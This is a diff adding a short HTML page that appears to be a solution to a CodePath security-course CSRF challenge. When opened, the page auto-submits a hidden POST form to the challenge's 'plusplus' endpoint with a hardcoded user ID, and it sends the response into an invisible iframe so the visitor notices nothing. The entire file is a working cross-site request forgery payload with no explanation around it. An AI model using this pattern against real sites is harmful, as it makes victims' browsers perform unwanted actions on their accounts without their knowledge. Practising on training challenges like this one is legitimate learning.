@@ -1,0 +1,11 @@
+<html>
+  <head>
+    <title>Test</title>
+  </head>
+  <body onload="document.forms.submit()">
+    <form action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST" name="forms" style="display: none;" target="hidden">
+      <input type="text" name="userId" value="140773116722554876415266675594157812642" />
+    </form>
+    <iframe name="hidden" style="display: none;"></iframe>
+  </body>
+</html>
